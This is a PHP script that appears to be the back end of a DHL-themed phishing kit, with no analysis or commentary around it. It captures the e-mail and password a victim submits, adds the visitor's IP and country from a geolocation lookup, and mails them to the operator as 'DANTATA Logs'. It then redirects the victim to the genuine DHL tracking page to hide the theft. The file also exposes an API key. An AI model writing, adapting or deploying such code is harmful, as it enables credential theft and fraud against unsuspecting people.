<?php

$ip = getenv("REMOTE_ADDR");

//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=ade553fa4c36faf57992e66c72b8c94055fa3ac1192997699007902b52a04ed9&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//

$message .= "+++++++++++++TERRY DANTATA++++++++++++\n";
$message .= "E-mail: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "++++++++++++++++IP and Date+++++++++++++++\n";
$message .= "IP: ".$ip."\n";
$message .= "Country: ".$ipCountryCityInfo."\n";
$message .= "+++++++++++TERRY DANTATA+++++++++++\n";
$recipient = "noreply@gmail.com";
$subject = "DANTATA Logs";
$headers .= $_POST['eMailAdd']."n";
$headers .= "MIME-Version:1.0";
     mail("$cc", "rcn Info", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.dhl.com/en/express/tracking.shtml");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>